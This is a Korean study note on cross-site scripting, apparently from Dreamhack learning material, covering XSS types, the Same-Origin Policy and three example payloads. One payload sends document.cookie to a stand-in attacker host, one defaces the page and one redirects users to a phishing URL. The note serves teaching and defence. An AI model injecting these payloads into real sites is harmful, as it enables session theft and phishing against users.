# **Dreamhack XSS**
- xss는 Cross Site Scripting로써 클라이언트 사이드 취약점 중 하나로, 공격자가 웹 리소스에 악성 스크립트를 삽입해 이용자의 웹 브라우저에서 해달 스크립트를 실행할 수 있다

- 공격자는 이 취약점을 통해 특정 계정의 세션 정보를 탈취하고 해당 계정으로 임의의 기능을 수행할 수 있다. (ex. 드림핵 웹 페이지에 xss취약점이 존재하면 https://dreamhack.io 내에서 오리진 권한으로 악성 스크립트를 삽입하는것, 그후 이용자가 악성 스크립트가 포함된 페이지를 방문하면 공격자가 임의로 삽입한 스크립트가 실행되어 쿠키 및 세션이 탈취될 수 있다.)

**xss의 종류**
```
 Stored XSS : XSS에 사용되는 악성 스크립트가 서버에 저장되고 서버의 응답에 담겨오는 XSS

 Reflected XSS : XSS에 사용되는 악성 스크립트가 URL에 삽입되고 서버의 응답에 담겨오는 XSS

 DOM-based XSS : XSS에 사용되는 악성 스크립트가 URL Fragment에 삽입되는 XSS (Fragment는 서버 요청, 서버 응답에 포함되지 않는다.)

 Universal XSS : 클라이언트의 브라우저 혹은 브라우저의 플러그인에서 발생하는 취약점으로 SOP 정책을 우회하는 XSS

*SOP란? : Same-Origin Policy의 약어로, 동일 출처 정책을     의미한다. 그리고 이것은 웹 보안 메커니즘 중 하나이며, 웹 브라우저에서 실행되는 스크립트가 다른 오리진(출처)의 리소스와 상호작용하는 것을 제한하는 정책이다. 이것이 있는 이유는 웹 보안을 강화하고 악의적인 스크립트로부터 사용자의 정보를 보호하기 위해 중요한 역할을 한다. 이 정책은 웹 브라우저에서 로드된 문서나 스크립트가 다른 도메인,프로토콜, 포트 번호에 있는 리소스에 접근하는 것을 제한한다.
    SOP의 원칙
    1. 동일한 프로토콜(예:HTTP,HTTPS)을 사용하는 경우
    2. 동일한 호스트 이름(예:www.example.com)을 가지는 경우
    3. 동일한 포트 번호를 사용하는 경우
```
**XSS의 예시**
- Figure 1. 쿠키 및 세션 탈취 공격 코드
```javascript
<script>
// "hello" 문자열 alert 실행.
alert("hello");
// 현재 페이지의 쿠키(return type: string)
document.cookie; 
// 현재 페이지의 쿠키를 인자로 가진 alert 실행.
alert(document.cookie);
// 쿠키 생성(key: name, value: test)
document.cookie = "name=test;";
// new Image() 는 이미지를 생성하는 함수이며, src는 이미지의 주소를 지정. 공격자 주소는 http://hacker.dreamhack.io
// "http://hacker.dreamhack.io/?cookie=현재페이지의쿠키" 주소를 요청하기 때문에 공격자 주소로 현재 페이지의 쿠키 요청함
new Image().src = "http://hacker.dreamhack.io/?cookie=" + document.cookie;
</script>
```
- Figure 2. 페이지 변조 공격 코드
```javascript
<script>
// 이용자의 페이지 정보에 접근.
document;
// 이용자의 페이지에 데이터를 삽입.
document.write("Hacked By DreamHack !");
</script>
```   
- Figure 3. 위치 이동 공격 코드
```javascript
<script>
// 이용자의 위치를 변경.
// 피싱 공격 등으로 사용됨.
location.href = "http://hacker.dreamhack.io/phishing"; 
// 새 창 열기
window.open("http://hacker.dreamhack.io/")
</script>
```

